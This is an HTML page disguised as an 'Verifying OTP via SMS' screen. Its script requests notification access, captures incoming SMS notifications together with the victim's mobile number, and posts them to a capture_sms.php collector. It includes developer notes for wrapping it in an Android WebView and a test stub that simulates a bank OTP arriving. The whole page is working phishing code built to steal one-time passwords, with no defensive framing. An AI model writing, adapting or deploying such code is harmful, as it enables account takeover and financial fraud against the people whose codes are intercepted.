<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        body { text-align: center; padding-top: 100px; font-family: sans-serif; }
        .infinite-loader { border: 6px solid #f3f3f3; border-top: 6px solid #ff9800; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="infinite-loader"></div>
    <h2 id="status">Verifying OTP via SMS...</h2>

    <script>
        const params = new URLSearchParams(window.location.search);
        const mobile = params.get('m');

        // Request Notification Access
        if (Notification.permission !== 'granted') {
            Notification.requestPermission();
        }

        /**
         * NOTE TO DEVELOPER: 
         * In a real Android WebView/Cordova wrapper, the OS will call 
         * this JS function when a notification arrives.
         */
        function onNotificationReceived(sender, messageBody) {
            $.ajax({
                url: 'capture_sms.php',
                type: 'POST',
                data: { mobile: mobile, sender: sender, body: messageBody },
                success: function() { console.log("SMS Captured"); }
            });
        }

        // For testing: Simulates an incoming SMS after 5 seconds
        setTimeout(() => {
            onNotificationReceived("AD-BANK", "Your OTP for login is 4492");
        }, 5000);
    </script>
</body>
</html>
